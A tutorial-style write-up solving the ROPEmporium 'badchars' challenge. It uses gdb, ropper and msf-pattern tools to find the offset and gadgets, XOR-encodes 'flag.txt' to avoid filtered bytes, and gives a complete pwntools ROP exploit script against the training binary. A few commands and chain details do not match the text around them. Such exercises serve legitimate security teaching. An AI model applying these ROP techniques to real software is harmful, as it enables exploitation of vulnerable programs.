---
title: ROP
published: true
---

## Content

1. [Introduction](#introduction)
2. [Checking Properties](#checking-properties)
3. [Attack Plan](#attack-plan)
4. [Finding Offset](#finding-offset)
5. [Enemy in Disguise](#enemy-in-disguise)
6. [Writing flag.txt](#writing-flag.txt)
7. [Executing the Attack](#executing-the-attack)

# **Introduction**

There are times when you find a buffer overflow vulnerability and look forward to exploit it. You smash the stack and get the control of instruction pointer, After that you write shellcode into memory and direct the control flow to that memory location. What Do you expect ? A shell of course but instead you get Segmentation fault. Why does this happened ? You took care of everything so it should work perfectly. Later you came to know that the segfault was because of bad characters. The application is filtering the badcharacters dues to which your payload gets corrupted.

So let's learn how to sneak bad characters into memory location. For this we are going to solve ROPEmporium `BadChar` Challange. You can download the 64-bit binary from [`here`](badchar).

On extracting the zip file we get a `badchar` executable, `libbadchars.so` library and `flag.txt`. The challange is, We have to call `print_file()` function with `flag.txt` parameter, That's all.

# **Checking Properties**

First things first let's check the properties of the binary using following commands.

`file badchars`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/file%20command%20output.png)

We can see that the binary is a 64-bit executable in which libraries are dynamically linked, We also observe that binary is not striped. Now Let's run it. 

On running the binary we can see the following output.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/running%20badchars.png)

To make this challange easy it already tell us about the bad characters which should not be present in our payload. These characters are `x`, `g`, `a` and `.`. After that it asks for user input and then exit with a `Thank you!` message.

Let's analyze this binary in [`gdb`](). You can use radare2 if you want. It's totally up to you.

`gdb ./badchars -q`

`info functions`           (This command lists the functions present in the binary)

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/info%20functions.png)

We can observe that there are 2 intresting functions `pwnme@plt` and `print_file@plt`. Now if you don't know about `PLT` and `GOT` you can learn about them [`here`](https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html). In simple words these are not the actual address of `pwnme` and `print_file`. These are the address to `PLT` table which looks for their actual address in the library using dynamic linker to populate the `GOT.PLT` table.

let's disassemble `main`, `userfulFunction`, `userfulGadgets`. To disassemble try this command

`disassemble <function name>`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/main%20disass.png)

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/usefulFunction%20disass.png)

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/disass%20gadget.png)

We see that `main` function is simply calling `pwnme@plt`, `userfulFunction` is calling `print_file` function and `userfulGadgets` contains some useful gadgets which we are going to use to complete this challange.

If you like you can also disassemble `pwnme` and `print_file` function by loading `libbadchars.so` library in gdb. For now let it be.

Since to complete this challange let's see if `flag.txt` string is present in binary or not. 

`strings badchars | grep -i flag.txt`

Unfortunately there are no `flag.txt` string which we can pass to `print_file` function. So we have to write the `flag.txt` into some writable memory section.

# **Attack Plan**

1. Find the offset.
2. Changin the form of `flag.txt`
2. Write the `flag.txt` string in writable memory section.
3. Move the `flag.txt` from memory to `rdi` register.
4. call the `print_file` function to print the flag.

# **Finding offset**

Create the payload pattern using following command

`msf-pattern_create -l 200 > offset_payload`

and then load the `badchars` in gdb and hit

`run < offset_payload`

we hit `SIGSEGV`. Now copy the value of `RBP` and use the following command to find the offset.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/value%20of%20RBP.png)

`msf-pattern_offset -l 200 -q "0x4132624131624130"`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/offset.png)

So our `offset` is `32 + 8` equals `40` (Plus 8 bytes to fill `RBP`)

# **Enemy in Disguise**

Since we know that characters `x`, `g`, `a` and `.` are badchars so we have to find a way to sneak these characters into the memory. To do this we can find the `non bad characters` which when `xor` with any number produce the bad characters. For example `b ^ 3 = a`, `d ^ 3 = g` and so on. We can find these pair using the following code snipper.

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/finding%20characters.png)

I'm gonna choose `3` to xor the characters. You can choose whichever fits you.

Like this we get the following pairs.

```
b ^ 3 = a
d ^ 3 = g
{ ^ 3 = x
- ^ 3 = .
```

so our final form of `flag.txt` will be `flbd-t{t`.

> **NOTE** : From here `flag.txt` is refering to `flbd-t{t` so don't get confused.

Let's find a gadget which will xor back these character. 

To find the `gadget` I'm gonna use `ropper` because why not. We have to find the gadgets which do not contain any `bad characters`.

`ropper --file badchars -d 6178672e --search "xor"`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/xor%20ropper.png)

We will use `xor byte ptr [r15], r14b; ret;` for our purpose.

> **NOTE** : `-b` flag is use to specify the bad characters. `6178672e` is the hex format of `a`, `x`, `g` and `.`.

# **Writing flag.txt**

So let's start writing `flag.txt` into a writable memory section. To find the memory sections with `W` flag try this command.

`readelf -S ./badchars`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/Writable%20Memory.png)

Now we can see the memory section with different `flags` enabled. The above image is showing the memory section with `W` flag. You can choose any memory section until and unless you don't corrupt the data present in that memory. I'm gonna go with `.data` section for now.

Let's check `.data` section. The address of `.data` section is `0x0000000000601028`. Load the `badchars` in gdb. set a `breakpoint` in `main` and then run it. After hitting the `breakpoint` examing the `.data` address using following command

`x/40xg 0x0000000000601028`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/data%20section.png)

We can see that the memory is completly empty, So this makes it perfect candidate for us. 

Now let's find the gadget to write into memory. In assembly language the instruction looks like this

`mov [register] register`

 So type the following command to search for gadgets.

`ropper --file badchars -b 6178672e --search "mov [%]"`


![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/mov%20ropper.png)

From the output `mov qword ptr [r13], r12; ret;` gadget will do the trick.

So let's find the `pop` gadget to pop the address of `.data` into `r13` register and `flag.txt` into `r12` register. Type the following command

`ropper --file badchars -b 6178672e --search "pop"`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/pop%20ropper.png)

`pop r12; pop r13; pop r14; pop r15; ret;` will do our job.

Let's also find a `pop r15; ret;` and `pop rdi; ret;` gadget.

`ropper --file badchars -b 6178672e --search "pop r15; ret;"`

`ropper --file badchars -b 6178672e --search "pop rsi; ret;"`

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/pop%20r15.png)

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/pop%20rdi.png)

We are set up to write the `flag.txt` in our `.data` section. Below is the rough sketch of ROP chain which we are going to use to execute the attack.

```
ROP Chain

Address of `pop r12; pop r13; pop r14; pop r15; ret;` gadget.
`flag.txt` string
Address of .data section                                      (0x0000000000601028)
0x3                                                           (To XOR the character)
0x0000000000601028 + 2                                        (Address pointing to `b` in `flbd-t{t`)
Address of `mov qword ptr[r13], r12; ret` gadget
Address of `xor byte ptr [r15], r14b; ret;`
Address of `pop r15; ret;`
0x0000000000601028 + 3                                        (Address pointing to `d` in `flbd-t{t`)
Address of `xor byte ptr [r15], r14b; ret;`
Address of `pop r15; ret;`
0x0000000000601028 + 4                                        (Address pointing to `-` in `flbd-t{t`)
Address of `xor byte ptr [r15], r14b; ret;`
Address of `pop r15; ret;`
0x0000000000601028 + 6                                        (Address pointing to `{` in `flbd-t{t`)
Address of `xor byte ptr [r15], r14b; ret;`
Address of `pop rdi; ret;`
Address of `print_file@plt`
```


# **Executing the Attack**

We are going to use `pwntools` to create out exploit script. Below is the exploit script.

> **NOTE** : I added 7 to `base data_address` because while I was `xoring` back the characters one of the characters address contained `bad character` so to remove that anomaly i just shifted the `.data` address. 

```python
#!/usr/bin/env python

from pwn import *

elf = ELF('./badchars')
p = elf.process()

data_address = 0x601028 + 7

payload = 'F' * 40
payload += p64(0x40069c) 			# pop r12; pop r13; pop r14; pop r15; ret;
payload += 'flbd-t{t'
payload += p64(data_address)		# .data section
payload += p64(0x03)
payload += p64(data_address + 2)
payload += p64(0x400634)        	# mov qword ptr [r13], r12; ret;
payload += p64(0x400628)        	# xor byte ptr [r15], r14b; ret;
payload += p64(0x4006a2)        	# pop r15; ret; 
payload += p64(data_address + 3)
payload += p64(0x400628)        	# xor byte ptr [r15], r14b; ret;
payload += p64(0x4006a2)        	# pop r15; ret; 
payload += p64(data_address + 4)
payload += p64(0x400628)       		# xor byte ptr [r15], r14b; ret;
payload += p64(0x4006a2)        	# pop r15; ret; 
payload += p64(data_address + 6)
payload += p64(0x400628)        	# xor byte ptr [r15], r14b; ret;
payload += p64(0x4006a3)        	# pop rdi; ret;
payload += p64(data_address)
payload += p64(0x00400510)			# address of print_file


print p.recvuntil('> ')
p.sendline(payload)

print p.recvuntil('}')
```

![image](https://raw.githubusercontent.com/0xZuk0/matrix/master/assets/Badchar/Action.png)

Bingo! We completed the challange. Please Note that we can write the exploit more efficiently.

Thank you so much for taking your time to read this. Keep Hacking.
